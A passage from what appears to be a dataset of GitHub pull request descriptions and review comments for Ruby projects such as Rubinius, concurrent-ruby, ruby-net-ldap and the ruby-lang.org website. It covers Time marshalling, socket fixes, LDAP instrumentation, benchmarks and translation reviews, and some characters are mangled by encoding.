`Rational(nsec, 1_000_000_000)`\x1c with `Rational(nsec / 1_000_000_000.0)`\x1c in `Time#subsec`,\x1c it works for this case, but breaks some others.\r\nI\'ve spent quite some time in MRI\'s `time.c`, but it\'s so bad written it looks as if it was obfuscated. Specifically the transformations that happen in `VALUE time_subsec(VALUE time)`\x1c.\r\nI\'ll try to wrap my head around `time.c`\x1d a bit more, or maybe someone here already knows the answer. :)', 'I wonder why our rational computation would be different then. Another thing, we already have this special case marshalling logic in a slightly different way, also check:\r\n\r\nhttps://github.com/rubinius/rubinius/blob/master/kernel/common/marshal19.rb#L26-L31', 'I just tried this in Rubinius and MRI 2.0 and it seems to return the same results:\r\n\r\n```\r\n0.252589.to_r\r\n=> (4550238905111545/18014398509481984)\r\n```', "">Another thing, we already have this special case marshalling logic in a slightly different way, also check:\r\n\r\nYou mean by using `__marshal__`\x1c? It has precedence over `_dump`\x1c, but I guess I could just call `_dump`\x1d from it, right?\r\n\r\n>I just tried this in Rubinius and MRI 2.0 and it seems to return the same results:\r\n\r\nYep, that's not the problem. It must be in `Time#subsec`\x1c, but I'm not sure."", ""Well, I think we should ignore the weird behavior from _dump for now. It really doesn't make much sense still what it does and we shouldn't need to change it if our regular marshal works correctly."", ""Ok, so I'll just make a few changes to ensure it works with Rails and the zone dumping for 2.0."", 'Yeah, that seems to me the best approach for now. We should also see how to fix that Rational conversion then, if `to_r` gives the same value on the float, we should be able to do the same somehow.', '>You mean by using `\x1c__marshal__`? It has precedence over `_dump`, but I guess I could just call `_dump` from it, right?\r\n\r\nI was wrong, `_dump`\x1d has precedence over `\x1d__marshal__`\x1d.', 'Awaiting feedback. :)\r\n\r\nMeanwhile, I\'ve also found a issue with `Time#zone`\x1c after getting the localtime with `#getlocal`\x1c.\r\nHere\'s an example of failing test (it returns nil):\r\n```ruby\r\nwith_timezone(""Asia/Kuwait"") do\r\n  Time.at(946684800.0).getlocal.zone.should == ""AST""\r\nend\r\n```\r\nWhich it totally makes sense, since `@offset`\x1c is not nil, thus `@decomposed[9]` is set to nil in `Array* Time::calculate_decompose(STATE)` but still, it passes on MRI. Will report more when I get back to it.', 'Forgot about fixing 18 mode.', 'Do we need __special_ stuff? Even if we ignore the _dump ordering issues etc.? ', '>Do we need __special_ stuff? Even if we ignore the _dump ordering issues etc.?\r\n\r\nWell we need a branch to handle this custom logic at some point. What are you suggesting? :)\r\n', ""Why not just use __construct__ and check that with respond_to? I get why it needs it because Time is marshalled as a user type, but it secretly isn't which is really weird imho. Using __construct__ as the name also makes it more consistent I think."", 'I\'ve added some `deviates_on :rubinius` guards on custom behaviour, while leaving the original one from MRI intact, so that other implementations can see it. It makes sense to me, I hope it does for the team too.\r\n\r\nEdit: I\'ve also got rid of all the ""special"" prefixes and restricted the custom logic to just `Time` objects\x1c.\r\nGoing back to yesterday\'s conversation about `respond_to?`\x1c overridden in gems, I think it\'s better to be safe than sorry here. :smile:  ']"
619,rubinius/rubinius,1786.0,"Also implements Rational#round

Two of the specs (regarding the edge-case precision values of -1_999_999 and 2_097_171, lines 42-49 of spec/ruby/shared/rational/round.rb) have some perf problems. The former takes ~8 seconds, the latter takes ~3.

I left these on at the advice of @dbussink on IRC. I'll be working on making those go faster next, probably.

","['This pull request [fails](http://travis-ci.org/rubinius/rubinius/builds/1655180) (merged dc50f958 into a8d53e40).', 'This pull request [passes](http://travis-ci.org/rubinius/rubinius/builds/1655404) (merged fd340f63 into a8d53e40).', 'This pull request [passes](http://travis-ci.org/rubinius/rubinius/builds/1655584) (merged d2150bd7 into a8d53e40).', 'This pull request [passes](http://travis-ci.org/rubinius/rubinius/builds/1656956) (merged 836d8824 into a8d53e40).', 'This pull request [passes](http://travis-ci.org/rubinius/rubinius/builds/1657223) (merged 43930671 into a8d53e40).', 'This pull request [passes](http://travis-ci.org/rubinius/rubinius/builds/1657362) (merged c2e17f5f into a8d53e40).', 'This pull request [passes](http://travis-ci.org/rubinius/rubinius/builds/1657497) (merged edd447ff into a8d53e40).']"
620,rubinius/rubinius,2014.0,"Socket#socketpair `type` argument can accept
a symbol that references to a `Socket::SOCK_*`
constant.

    require 'socket'

    # Before

    Socket.socketpair(Socket::PF_UNIX, Socket::SOCK_DGRAM, 0)
    # => [#<Socket:fd 11>, #<Socket:fd 12>]

    Socket.socketpair(Socket::PF_UNIX, :DGRAM, 0)
    # => TypeError: Tried to use non-reference value 0x15a86 as type Bignum (10)

    # After

    Socket.socketpair(Socket::PF_UNIX, Socket::SOCK_DGRAM, 0)
    # => [#<Socket:fd 7>, #<Socket:fd 8>]
    Socket.socketpair(Socket::PF_UNIX, :DGRAM, 0)
    # => [#<Socket:fd 9>, #<Socket:fd 10>]

Fixes #2011.","[""Obviously, this is not finished. I'm new to Rubinius and I'm starting to use it in development. I read the contributing guide and I know that I have to add specs for this (I'll investigate how to do it). If someone has a better fix, please send it!\r\n\r\nAnyway, I just want it to give it a try :)"", 'I added some specs. Any feedback will be welcome :)\r\n\r\n```\r\nfrodsan$ mspec spec/ruby/library/socket/socket/pair_spec.rb \r\nrubinius 2.0.0rc1 (1.9.3 2242f14b 2012-11-02 JI) [x86_64-apple-darwin12.2.0]\r\n...\r\n\r\nFinished in 0.027147 seconds\r\n\r\n1 file, 3 examples, 7 expectations, 0 failures, 0 errors\r\n```', 'Did you also verify the behavior in 1.8 mode?', 'This is the behaviour in Ruby 1.8.7.\r\n\r\n```\r\n>> RUBY_VERSION\r\n=> ""1.8.7""\r\n>> require \'socket\'\r\n=> true\r\n>> Socket.socketpair(Socket::PF_UNIX, Socket::SOCK_DGRAM, 0)\r\n=> [#<Socket:0x109bfc750>, #<Socket:0x109bfc778>]\r\n>> Socket.socketpair(Socket::PF_UNIX, :DGRAM, 0)\r\nErrno::EPROTONOSUPPORT: Protocol not supported - socketpair(2)\r\n\tfrom (irb):3:in `socketpair\'\r\n\tfrom (irb):3\r\n```\r\n\r\nand this is with Rubinius -X18 mode:\r\n\r\n```\r\n>> require \'socket\'\r\n=> true\r\n>> Socket.socketpair(Socket::PF_UNIX, Socket::SOCK_DGRAM, 0)\r\n=> [#<Socket:0x1714>, #<Socket:0x1718>]\r\n>> Socket.socketpair(Socket::PF_UNIX, :DGRAM, 0)\r\nTypeError: Tried to use non-reference value 0xf26e as type Bignum (10)\r\n```\r\n\r\nWhat should I do? Thanks :)', ""Probably needs a similar check to see if it's a valid constant in 1.8 mode and throw a Errno::EPROTONOSUPPORT when it isn't one."", 'Something like this?\r\n\r\n```\r\n--- a/lib/18/socket.rb\r\n+++ b/lib/18/socket.rb\r\n@@ -682,6 +682,8 @@ class Socket < BasicSocket\r\n       else\r\n         raise SocketError, ""unknown socket type #{type}""\r\n       end\r\n+    elsif !type.kind_of? Integer\r\n+      raise SocketError, ""unknown socket type #{type}""\r\n     end\r\n \r\n     FFI::MemoryPointer.new :int, 2 do |mp|\r\n```\r\n\r\nResult:\r\n\r\n```\r\n>> Socket.socketpair(Socket::PF_UNIX, :DGRAM, 0)\r\nSocketError: unknown socket type DGRAM\r\n```', 'Well, we should raise the same exception as MRI. And we should also add a spec for that then', ""@dbussink Updated. I can't run the tests in X18 mode yet :(\r\n\r\n```\r\n$ RBXOPT=-X18 bin/mspec spec/ruby/library/socket/socket/socketpair_spec.rb\r\nrubinius 2.0.0rc1 (1.9.3 6b18a0e4 2012-11-02 JI) [x86_64-apple-darwin12.2.0]\r\n...\r\n\r\nFinished in 0.018068 seconds\r\n\r\n1 file, 3 examples, 7 expectations, 0 failures, 0 errors\r\n```\r\n"", ""Oops ... I misinterpreted the documentation:\r\n\r\n```\r\n./configure --enable-version=1.9,2.0 --default-version=1.9\r\n```\r\n\r\nI didn't enable 1.8 mode. Now, works fine. Thanks :+1:\r\n\r\n```\r\n$ RBXOPT=-X18 bin/mspec spec/ruby/library/socket/socket/pair_spec.rb \r\nrubinius 2.0.0rc1 (1.8.7 927ff0e8 2012-11-02 JI) [x86_64-apple-darwin12.2.0]\r\n..\r\n\r\nFinished in 0.022539 seconds\r\n\r\n1 file, 2 examples, 2 expectations, 0 failures, 0 errors\r\n```"", 'I strongly suggest not changing configure options when developing on Rubinius, to prevent issues such as these. Also could you please split the changes for 1.8 mode in a separate commit for the spec addition? Just like the changes for 1.9 mode.', 'Done.', 'Thnx!', '@frodsan Thanks :-) ']"
621,rubinius/rubinius,2066.0,,"['The spec/core/ffi files are from before the spec/ruby/optional/ffi specs. The spec/core/ffi specs are deprecated and will be removed. Could you ensure that the specs are in spec/ruby/optional/ffi or add them?', ""Thank you @brixen \r\n\r\nI've just added FFI::Platform specs. (git question: is this right to rebase before adding some commits for you?)"", '@nibua-r yes, please rebase to master HEAD.', ""@brixen Isn't it what I have done?"", ""@nibua-r I'm not sure, looks weird here. I'll merge manually."", ""Thanks @brixen That's strange, I'll check that back at home."", ""Strange. Anyway, thank you. I'll check if some action is required when back aT home.\r\n\r\n\r\nBrian Ford <notifications@github.com> a \xc3\xa9crit\xc2\xa0:\r\n\r\n>@nibua-r I'm not sure, looks weird here. I'll merge manually.\r\n>\r\n>---\r\n>Reply to this email directly or view it on GitHub:\r\n>https://github.com/rubinius/rubinius/pull/2066#issuecomment-10922297\r\n\r\n-- \r\nEnvoy\xc3\xa9 de mon t\xc3\xa9l\xc3\xa9phone Android avec K-9 Mail. Excusez la bri\xc3\xa8vet\xc3\xa9."", ""One more thing, apparently you changed / touched lib/ext/melbourne/grammar18.cpp, that's probably not intended."", ""I'm really sorry I'll fix this ASAP\r\n\r\n\r\nDirkjan Bussink <notifications@github.com> a \xc3\xa9crit\xc2\xa0:\r\n\r\n>One more thing, apparently you changed / touched\r\n>lib/ext/melbourne/grammar18.cpp, that's probably not intended.\r\n>\r\n>---\r\n>Reply to this email directly or view it on GitHub:\r\n>https://github.com/rubinius/rubinius/pull/2066#issuecomment-10927824\r\n\r\n-- \r\nEnvoy\xc3\xa9 de mon t\xc3\xa9l\xc3\xa9phone Android avec K-9 Mail. Excusez la bri\xc3\xa8vet\xc3\xa9."", 'Should be fixed now.']"
622,rubinius/rubinius,2106.0,"Evaluates now, which encoding should be used while merging strings.
Throws an error, if no compatible encoding could be found.
",[]
623,rubinius/rubinius,2252.0,"Currently File.realpath fails reading relative symlinks.
It uses Dir.pwd to expand file path, while it should use current link path.
For example, when using homebrew:
`` irb(main):003:0*   File.realpath('/usr/local/opt/rbenv')
Errno::ENOENT: No such file or directory - /Users/andriy/dev/Cellar/rbenv/0.4.0
	from kernel/common/file19.rb:128:in `realpath'
	from (irb):3
	from kernel/common/block_environment.rb:75:in `call_on_instance'
	from kernel/common/eval.rb:75:in `eval'
	from kernel/common/kernel19.rb:42:in `loop'
	from kernel/bootstrap/proc.rb:22:in `call'
	from kernel/common/throw_catch19.rb:8:in `catch'
	from kernel/common/throw_catch.rb:10:in `register'
	from kernel/common/throw_catch19.rb:7:in `catch'
	from kernel/bootstrap/proc.rb:22:in `call'
	from kernel/common/throw_catch19.rb:8:in `catch'
	from kernel/common/throw_catch.rb:10:in `register'
	from kernel/common/throw_catch19.rb:7:in `catch'
	from kernel/common/codeloader.rb:212:in `require'
	from kernel/common/kernel.rb:638:in `gem_original_require (require)'
	from /Users/andriy/dev/rubinius/lib/rubygems/custom_require.rb:36:in `require'
	from kernel/loader.rb:681:in `irb'
	from kernel/loader.rb:817:in `main'irb(main):004:0> 
``
","['Ok, one general issue remaining. Could you please split up commits to spec/ from commits to other code? This makes merging stuff back into rubyspec a lot easier for us.', 'Done.', 'Thanks!']"
624,rubinius/rubinius,2307.0,,[]
625,rubinius/rubinius,2386.0,The journey of encoding support goes on for ever and ever..,[]
626,rubinius/rubinius,2402.0,"Specs based on docs (http://www.ruby-doc.org/core-2.0/ThreadGroup.html) and running MRI 1.9.3.

I think this will fix #2389","[""I also cleaned up the extra blank lines I inadvertently added. You didn't comment on them, but they weren't consistent with the other code I looked at.""]"
627,rubinius/rubinius,2475.0,,['Thank you!']
628,rubinius/rubinius,2484.0,,"['Thank you!', 'Thanks for working on all these fixes :)']"
629,rubinius/rubinius,2516.0,"Turns out there were many tags without the corresponding tests.
Also, a few tests were tagged as failing, but were actually passing.
Left out unstable ones about threads and external environment encoding.
There might be some I didn't know they're unstable/unsafe to delete, if so, please let me know.",[]
630,rubinius/rubinius,2491.0,"Tricky behavior, but that's how MRI does it. :grin:
As always, feedback is very welcome.","['Hmmm, the point @kachick makes is a good one. This is bound to be confusing and changing Rubinius::Type.object_respond_to? means we also change behavior in for existing use cases. How about adding a helper method for just the Array case and leaving Rubinius::Type.object_respond_to? as it works now by making sure it mimics Kernel#respond_to? behavior?', 'Btw, I do think having the additional argument for Rubinius::Type.object_respond_to? is useful to have, like for Kernel#respond_to?', '>How about adding a helper method for just the Array case and leaving Rubinius::Type.object_respond_to? as it works now by making sure it mimics Kernel#respond_to? behavior?\r\n\r\nTotally agree. Will rework the patch soon. Thanks for the fantastic feedback. :)']"
631,ruby-concurrency/concurrent-ruby,284.0,"- Add `ns_initialize` for ivars setting  inside synchronize block
- cleans up the Synchronization::Object space
- add `ensure_ivar_visibility!` for final fields
- add volatile attributes","['After applying the new capabilities of `Synchronization::Object` to `Edge::Future` on the obvious places the performance improved. It now has better or same performance as old implementations.\r\n```txt\r\nCalculating -------------------------------------\r\n           value-old    19.844k i/100ms\r\n           value-new    21.473k i/100ms\r\n-------------------------------------------------\r\n           value-old    300.837k (\xc2\xb113.9%) i/s -      2.937M\r\n           value-new    295.720k (\xc2\xb118.5%) i/s -      2.813M\r\n\r\nComparison:\r\n           value-old:   300836.7 i/s\r\n           value-new:   295720.0 i/s - 1.02x slower\r\n\r\nCalculating -------------------------------------\r\n           graph-old    59.000  i/100ms\r\n           graph-new   231.000  i/100ms\r\n-------------------------------------------------\r\n           graph-old    777.004  (\xc2\xb132.9%) i/s -      6.431k\r\n           graph-new      2.211k (\xc2\xb125.2%) i/s -     20.328k\r\n\r\nComparison:\r\n           graph-new:     2211.0 i/s\r\n           graph-old:      777.0 i/s - 2.85x slower\r\n\r\nCalculating -------------------------------------\r\n       immediate-old   924.000  i/100ms\r\n       immediate-new   969.000  i/100ms\r\n-------------------------------------------------\r\n       immediate-old      9.124k (\xc2\xb123.4%) i/s -     84.084k\r\n       immediate-new      9.134k (\xc2\xb124.7%) i/s -     82.365k\r\n\r\nComparison:\r\n       immediate-new:     9133.6 i/s\r\n       immediate-old:     9123.7 i/s - 1.00x slower\r\n\r\nCalculating -------------------------------------\r\n            then-old   402.000  i/100ms\r\n            then-new   410.000  i/100ms\r\n-------------------------------------------------\r\n            then-old      4.306k (\xc2\xb128.2%) i/s -     36.984k\r\n            then-new      4.506k (\xc2\xb127.1%) i/s -     40.590k\r\n\r\nComparison:\r\n            then-new:     4505.6 i/s\r\n            then-old:     4306.2 i/s - 1.05x slower\r\n```\r\nBefore with only `synchronize` it was:\r\n```txt\r\nCalculating -------------------------------------\r\n           value-old    17.623k i/100ms\r\n           value-new    11.537k i/100ms\r\n-------------------------------------------------\r\n           value-old    293.436k (\xc2\xb115.9%) i/s -      2.837M\r\n           value-new    254.683k (\xc2\xb113.1%) i/s -      2.504M\r\n\r\nComparison:\r\n           value-old:   293436.4 i/s\r\n           value-new:   254682.8 i/s - 1.15x slower\r\n\r\nCalculating -------------------------------------\r\n           graph-old    73.000  i/100ms\r\n           graph-new   237.000  i/100ms\r\n-------------------------------------------------\r\n           graph-old    863.588  (\xc2\xb126.5%) i/s -      7.592k\r\n           graph-new      2.502k (\xc2\xb118.0%) i/s -     23.700k\r\n\r\nComparison:\r\n           graph-new:     2501.6 i/s\r\n           graph-old:      863.6 i/s - 2.90x slower\r\n\r\nCalculating -------------------------------------\r\n       immediate-old   956.000  i/100ms\r\n       immediate-new   678.000  i/100ms\r\n-------------------------------------------------\r\n       immediate-old      9.920k (\xc2\xb121.0%) i/s -     92.732k\r\n       immediate-new      6.752k (\xc2\xb113.1%) i/s -     65.766k\r\n\r\nComparison:\r\n       immediate-old:     9919.6 i/s\r\n       immediate-new:     6752.0 i/s - 1.47x slower\r\n\r\nCalculating -------------------------------------\r\n            then-old   518.000  i/100ms\r\n            then-new   519.000  i/100ms\r\n-------------------------------------------------\r\n            then-old      5.312k (\xc2\xb123.5%) i/s -     48.174k\r\n            then-new      4.431k (\xc2\xb119.5%) i/s -     41.520k\r\n\r\nComparison:\r\n            then-old:     5312.2 i/s\r\n            then-new:     4431.2 i/s - 1.20x slower\r\n```', 'Documentation added, see https://github.com/ruby-concurrency/concurrent-ruby/blob/synchronization/doc/synchronization.md', ':+1: ', "":+1: I'm :ok_hand: with merging this. I'll rebase and continue working on #271, #283, and #280 afterwards."", ""Unfortunately there is an almost consistently failing test in rbx, I'll try to fix it first and then I'll merge."", ""The failing test is not using `Synchronized::Object` and I cannot get it reproduced :/ If It succeeds at least once on travis I'll merge this branch and add it to intermittently failing tests. "", ""I would prefer to merge this branch then work on the failing test afterwards:\r\n\r\n1. This code needs to be in master for is to proceed with our other work\r\n1. As noted, the failing test appears to be unrelated to the changes in this PR\r\n1. I spent over an hour the other day trying to get Rbx to install on an Ubuntu laptop and wasn't successful, so fixing this test may be very difficult"", 'Merging since travis gave a different intermittent error.', ':+1: ', ""I was able to install Rbx on my MacBook Pro and I've been unable to reproduce the failed test. I think it's safe to call this an intermittent failure and add it to the list."", '@jdantonio added.']"
632,ruby-ldap/ruby-net-ldap,101.0,"This PR works to add hooks for instrumentation/logging around network calls.

This specific implementation works well with [`ActiveSupport::Notifications`](http://api.rubyonrails.org/classes/ActiveSupport/Notifications.html) but does not depend on it, only on an object that responds to `instrument(event_name, payload, &block)` (like the `MockInstrumentationService` for the tests).

This wraps the new private methods `Net::LDAP::Connection#read` and `Net::LDAP::Connection#write`.

Thoughts?
","['Might need help with figuring out why jruby-1.9 is failing: https://travis-ci.org/ruby-ldap/ruby-net-ldap/jobs/33450895\r\n', ""Guess it's been failing consistently: https://travis-ci.org/ruby-ldap/ruby-net-ldap/builds"", 'Thinking about this as a way to get information about the content length on read:\r\n\r\n``` diff\r\ndiff --git a/lib/net/ber/ber_parser.rb b/lib/net/ber/ber_parser.rb\r\nindex 682a599..47379b8 100644\r\n--- a/lib/net/ber/ber_parser.rb\r\n+++ b/lib/net/ber/ber_parser.rb\r\n@@ -160,6 +160,7 @@ module Net::BER::BERParser\r\n     if -1 == content_length\r\n       raise Net::BER::BerError, ""Indeterminite BER content length not implemented.""\r\n     else\r\n+      yield id, content_length if block_given?\r\n       data = read(content_length)\r\n     end\r\n \r\ndiff --git a/lib/net/ldap.rb b/lib/net/ldap.rb\r\nindex 234a0a3..7c4c396 100644\r\n--- a/lib/net/ldap.rb\r\n+++ b/lib/net/ldap.rb\r\n@@ -1268,14 +1268,17 @@ class Net::LDAP::Connection #:nodoc:\r\n   end\r\n \r\n   def read(syntax = Net::LDAP::AsnSyntax)\r\n-    instrument ""read.net_ldap_connection"", :syntax => syntax do\r\n-      @conn.read_ber(syntax)\r\n+    instrument ""read.net_ldap_connection"", :conn => @conn, :syntax => syntax do |payload|\r\n+      @conn.read_ber(syntax) do |id, content_length|\r\n+        payload[:response_id]    = id\r\n+        payload[:content_length] = content_length\r\n+      end\r\n     end\r\n   end\r\n   private :read\r\n \r\n   def write(packet)\r\n-    instrument ""write.net_ldap_connection"", :packet => packet do\r\n+    instrument ""write.net_ldap_connection"", :conn => @conn, :packet => packet do\r\n       @conn.write(packet)\r\n     end\r\n   end\r\n```\r\n', 'Specifically, the `@conn.read_ber` call with a block.\r\n', ""@schaary would love some feedback on whether this will be considered for release or if I should instead maintain my own fork. Not sure what your contribution policies are, if they've changed since the last substantive `Hacking.rdoc` changes, if this repo is mostly in maintenance mode, etc. Any feedback appreciated.\r\n"", ""Still need to update docs and instrument other methods similar to `search`. I'm also happy to extract unrelated changes (such as using the `Net::LDAP::PDU::RequestOrResponseConstant` instead of equivalent integers) if that makes this easier to accept.\r\n"", ""This looks interesting\xe2\x80\x94I'm not deep in the code enough to act on it myself, but this should probably be considered as I recall seeing a number of performance issues raised over time, and this should make it easier to find.\r\n\r\nI also agree with your general commentary about repeated complex stanzas, @mtodd."", ""I realized that there were a couple unrelated changes merged into this branch (because I was reusing this branch to do work in github/ruby-net-ldap) from https://github.com/ruby-ldap/ruby-net-ldap/pull/102 and https://github.com/ruby-ldap/ruby-net-ldap/pull/103. I'm happy to fix that, though if those two PRs get merged before this, it should reduce the diff here (this is the route I would recommend).\r\n\r\nAny specific feedback that I can get working on here to get this into a state for merging? Any relevant documentation you feel is missing?\r\n""]"
633,ruby/www.ruby-lang.org,528.0,,"[""@namsk Could you review this and #531 , #532 , #533 ?\r\n\r\nI can't review Korean language."", '@hsbt \r\nI got it.\r\nGive me some time to review.\r\nI will review in order.\r\n\r\nThanks.', '@marocchino \r\nI added some line comment at File Changed tab.\r\nI found a bad link but original en page has same error. I will add issue for it.\r\nThanks.', ""Ok, did it. :)\r\nAnd If you don't mind, I want merge this before resolve issue #587 ."", '@marocchino \r\nThank you.']"
634,ruby/www.ruby-lang.org,684.0,rel to #681,"['@ruby/www-ruby-lang-org-i18n-ja :eyeglasses:?', '@sorah @takahashim Could I merge it?', ':+1: ', 'Looks good!', 'Thank you for reviewing!']"
635,ruby/www.ruby-lang.org,725.0,@ruby/www-ruby-lang-org-i18n-it please review! :octocat: ,"['@ruby/www-ruby-lang-org-i18n-it everything should be fixed now. Waiting your approval to merge! Thanks!', ':+1: ']"
636,ruby/www.ruby-lang.org,770.0,"@ruby/www-ruby-lang-org-i18n-fr on s'est un peu relch sur Mai :do_not_litter: 

Si quelqu'un pouvait relire et valider, je lui en saurais gr!

Merci.

---

We forgot about May :do_not_litter: 

If one of you could review and validate this, I'd be glad!

Thanks.","['Bonjour @chikamichi, thanks for your news translation. Please describe your Pull Request in English so that other people could understand and help. :smiley: \r\n\r\nMerci beaucoup!', 'Thank you for your review, @chatgris.']"
637,ruby/www.ruby-lang.org,829.0,"Hi,

This is a french translation for the latest news.

I think some parts are perfectible.

Best regards.","['@GRoguelon Thanks for yours contributions! :tada:', 'I amended the comments except ```biblioth\xc3\xa8que``` I think it must be pluralized.\r\n\r\ncc @chatgris ', 'Done!', '@GRoguelon thx for the PR.']"
638,ruby/www.ruby-lang.org,983.0,,['@namsk review please.']
639,ruby/www.ruby-lang.org,988.0,"- plain   
- pull request(s)   
-    : http://krdic.naver.com/detail.nhn?docid=11030100#FGN10350
-    http://ko.wikipedia.org/wiki/%EB%A3%A8%EB%B9%84_%EC%98%A8_%EB%A0%88%EC%9D%BC%EC%A6%88
-   
-   
-  ->  (except python's list, mailing list)
- , ,   
-   : http://krdic.naver.com/detail.nhn?docid=12325000#FGN12434
-   
-    http://krdic.naver.com/detail.nhn?docid=12976200
- ,   , 
-    : http://krdic.naver.com/detail.nhn?docid=13282200#FGN13304
- ,  
-    http://krdic.naver.com/detail.nhn?docid=16924400
-     
-    : http://krdic.naver.com/detail.nhn?docid=18255000#FGN15651
-    : http://krdic.naver.com/detail.nhn?docid=18303700#FGN15944
- -  
-   
- ,    http://krdic.naver.com/detail.nhn?docid=23179600
- ,   
-    http://krdic.naver.com/detail.nhn?docid=23612200
-   
-   
-   
-   
-    http://ko.wikipedia.org/wiki/%EC%86%8D%EC%84%B1_(%EC%BB%B4%ED%93%A8%ED%84%B0_%EA%B3%BC%ED%95%99)
-    : https://twitter.com/urimal365/status/379787018982543360
-    : http://krdic.naver.com/detail.nhn?docid=25563200
-   
- ,   
-   
-    : http://krdic.naver.com/detail.nhn?docid=29055800#FGN22428
-    : http://ko.wikipedia.org/wiki/%EC%9D%B4%EB%A7%A5%EC%8A%A4
-   
-    : http://krdic.naver.com/detail.nhn?docid=36872000#FGN23777
-    : http://krdic.naver.com/detail.nhn?docid=36911900#FGN23786
- ,   
-  ,     
- ,    : http://krdic.naver.com/detail.nhn?docid=44820800
-    : http://krdic.naver.com/rescript_detail.nhn?seq=6055
- ,   (when it uses in code)
- ,  : http://krdic.naver.com/search.nhn?query=%EC%BD%94%EB%A9%98%ED%8A%B8&kind=all
- ,    http://krdic.naver.com/detail.nhn?docid=38636300#FGN24884
-    : http://krdic.naver.com/list.nhn?fgnseq=26161&kind=foreign&letter=%E3%85%8B&group=%ED%81%AC#26161
- ,    : http://krdic.naver.com/detail.nhn?docid=11042900#FGN10420
-   
-    : http://krdic.naver.com/detail.nhn?docid=22035700#FGN17434
-    : http://krdic.naver.com/detail.nhn?docid=39850700#FGN27334
- ,    
-       
-    : http://krdic.naver.com/detail.nhn?docid=40276100
-   , 
-   
-   
-    http://krdic.naver.com/detail.nhn?docid=40275800#FGN28169
- ,   
-    : http://krdic.naver.com/detail.nhn?docid=41008600
-    http://krdic.naver.com/detail.nhn?docid=41005000
-   
-    http://krdic.naver.com/detail.nhn?docid=41056300#FGN29566
-    : http://krdic.naver.com/rescript_detail.nhn?seq=39
-    http://krdic.naver.com/detail.nhn?docid=41900200#FGN30345
-   ","['@yous If you have any other suggestions, feel free to write comments.', '- \xec\xbb\xa8\xed\x8d\xbc\xeb\x9f\xb0\xec\x8a\xa4 \xe2\x86\x92 \xec\xbd\x98\xed\x8d\xbc\xeb\x9f\xb0\xec\x8a\xa4 http://krdic.naver.com/rescript_detail.nhn?seq=6055', '- \xeb\xb8\x94\xeb\x9f\xad \xe2\x86\x92 \xeb\xb8\x94\xeb\xa1\x9d http://krdic.naver.com/detail.nhn?docid=18303700#FGN15944', ""- \xed\x81\xb4\xeb\x9f\xac\xec\xa0\x80 \xe2\x86\x92 \xed\x81\xb4\xeb\xa1\x9c\xec\xa0\x80 http://krdic.naver.com/detail.nhn?docid=11042900#FGN10420 (the link explains 'disclosure', but the pronunciation of 'closure' part is same)"", '- \xeb\xb2\xa0\xec\x9d\xb4\xec\xa7\x81 \xe2\x86\x92 \xeb\xb2\xa0\xec\x9d\xb4\xec\x8b\x9d http://krdic.naver.com/detail.nhn?docid=16588900#FGN15045 (weird, though)\r\n- \xec\x93\xb0\xeb\xa0\x88\xeb\x93\x9c \xe2\x86\x92 \xec\x8a\xa4\xeb\xa0\x88\xeb\x93\x9c\r\n- \xec\xbb\xa8\xec\xbb\xa4\xeb\x9f\xb0\xed\x8a\xb8 \xec\x93\xb0\xeb\xa0\x88\xeb\x93\x9c, \xec\xbb\xa8\xec\xbb\xa4\xeb\x9f\xb0\xed\x8a\xb8 \xec\x8a\xa4\xeb\xa0\x88\xeb\x93\x9c \xe2\x86\x92 \xeb\xb3\x91\xeb\xa0\xac \xec\x8a\xa4\xeb\xa0\x88\xeb\x93\x9c\r\n- \xec\x96\xb4\xed\x94\x8c\xeb\xa6\xac\xec\xbc\x80\xec\x9d\xb4\xec\x85\x98 \xe2\x86\x92 \xec\x95\xa0\xed\x94\x8c\xeb\xa6\xac\xec\xbc\x80\xec\x9d\xb4\xec\x85\x98', '- \xed\x94\x84\xeb\xa1\x9c\xea\xb7\xb8\xeb\xa0\x88\xeb\xa8\xb8 \xe2\x86\x92 \xed\x94\x84\xeb\xa1\x9c\xea\xb7\xb8\xeb\x9e\x98\xeb\xa8\xb8\r\n- \xed\x85\x8c\xed\x81\xac\xeb\x86\x80\xeb\x9f\xac\xec\xa7\x80 \xe2\x86\x92 \xed\x85\x8c\xed\x81\xac\xeb\x86\x80\xeb\xa1\x9c\xec\xa7\x80 http://krdic.naver.com/detail.nhn?docid=22035700#FGN17434\r\n- \xec\xb2\xb4\xeb\x84\x90 \xe2\x86\x92 \xec\xb1\x84\xeb\x84\x90\r\n- \xec\xb2\xb4\xed\x8c\x85 \xe2\x86\x92 \xec\xb1\x84\xed\x8c\x85\r\n- plain \xed\x85\x8d\xec\x8a\xa4\xed\x8a\xb8 \xe2\x86\x92 \xed\x94\x8c\xeb\xa0\x88\xec\x9d\xb8 \xed\x85\x8d\xec\x8a\xa4\xed\x8a\xb8 or \xed\x8f\x89\xeb\xac\xb8', ""well, \xeb\xb9\x84\xec\xa3\xbc\xec\x96\xbc \xeb\xb2\xa0\xec\x9d\xb4\xec\xa7\x81 is MS's product name, I think we will respect product name. \r\nhttp://ko.wikipedia.org/wiki/%EB%B9%84%EC%A3%BC%EC%96%BC_%EB%B2%A0%EC%9D%B4%EC%A7%81"", 'Agreed with \xeb\xb9\x84\xec\xa3\xbc\xec\x96\xbc \xeb\xb2\xa0\xec\x9d\xb4\xec\xa7\x81.\r\n\r\n- \xed\x8a\xb8\xeb\xa0\x88\xed\x82\xb9 \xe2\x86\x92 \xed\x8a\xb8\xeb\x9e\x98\xed\x82\xb9\r\n- \xed\x81\xb4\xeb\x9e\x98\xec\x9e\x84 \xe2\x86\x92 \xed\x81\xb4\xeb\xa0\x88\xec\x9e\x84\r\n- \xec\x9d\xb4\xeb\xa9\x95\xec\x8a\xa4 \xe2\x86\x92 \xec\x9d\xb4\xeb\xa7\xa5\xec\x8a\xa4 http://ko.wikipedia.org/wiki/%EC%9D%B4%EB%A7%A5%EC%8A%A4\r\n- \xeb\xa9\x94\xec\x84\xb8\xec\xa7\x80 \xe2\x86\x92 \xeb\xa9\x94\xec\x8b\x9c\xec\xa7\x80 http://krdic.naver.com/detail.nhn?docid=13282200#FGN13304\r\n- \xed\x94\x8c\xeb\xa0\x88\xeb\x8b\x9b \xe2\x86\x92 \xed\x94\x8c\xeb\x9e\x98\xeb\x8b\x9b\r\n- \xec\xbb\xa8\xed\x85\x90\xec\xb8\xa0 \xe2\x86\x92 \xec\xbd\x98\xed\x85\x90\xec\xb8\xa0 http://krdic.naver.com/detail.nhn?docid=44820800\r\n- \xed\x94\x84\xeb\xa1\x9c\xea\xb7\xb8\xeb\xa0\x88\xeb\xb0\x8d \xe2\x86\x92 